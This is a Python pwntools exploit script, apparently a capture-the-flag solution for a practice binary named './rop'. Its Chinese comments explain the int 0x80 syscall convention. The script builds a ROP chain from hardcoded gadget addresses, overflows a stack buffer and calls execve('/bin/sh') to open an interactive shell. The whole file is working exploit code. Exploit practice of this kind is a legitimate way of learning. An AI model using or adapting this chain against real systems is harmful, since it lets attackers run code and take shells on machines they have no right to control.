#!/usr/bin/python
# -*- coding: UTF-8 -*- 

from pwn import *
#把系统调用的编号存入 EAX；
#把函数参数存入其它通用寄存器；
#触发 0x80 号中断（int 0x80）。

#execve('/bin/sh',null,null)
#int 0x80
#define __NR_execve 11


io = process('./rop')

esp_addr = 0xffffcfb0
ebp_addr = 0xffffd038

v4_addr = esp_addr + 0x1c
v4_to_ebp = ebp_addr - v4_addr

eax_ret = 0x080bb196
edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x080be408

payload = flat(['A'*(v4_to_ebp+4),eax_ret,0xb,edx_ecx_ebx_ret,0,0,binsh,int_0x80])
print payload
io.sendline(payload)
io.interactive()

